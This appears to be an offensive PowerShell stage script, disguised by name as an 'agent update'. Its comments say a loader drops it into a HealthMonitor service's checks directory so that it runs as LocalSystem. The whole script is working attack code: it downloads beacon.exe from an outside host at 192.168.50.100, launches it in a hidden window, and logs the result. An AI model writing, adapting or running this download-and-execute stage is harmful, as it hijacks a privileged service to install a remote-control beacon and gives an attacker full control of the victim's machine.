# agent-update.ps1 - dropped into the HealthMonitor checks directory by the loader.
# HealthMonitor runs this as LocalSystem; it brings the beacon up and leaves a log line.

$ErrorActionPreference = 'Continue'
$root = 'C:\ProgramData\HealthMonitor'
$log  = Join-Path $root 'agent.log'
$dst  = 'C:\ProgramData\c0015\beacon.exe'
$url  = 'http://192.168.50.100/beacon.exe'

function W($m) { Add-Content -LiteralPath $log -Value ("{0} {1}" -f (Get-Date -Format 'HH:mm:ss'), $m) }

W "update.ps1 start as $(whoami)"
New-Item -ItemType Directory -Force 'C:\ProgramData\c0015' | Out-Null
try {
    Invoke-WebRequest -Uri $url -OutFile $dst -UseBasicParsing -TimeoutSec 120
    W "beacon downloaded"
} catch {
    W "beacon download failed: $($_.Exception.Message)"
    exit 1
}
try {
    Start-Process -FilePath $dst -WindowStyle Hidden
    W "beacon started"
} catch {
    W "beacon start failed: $($_.Exception.Message)"
    exit 1
}
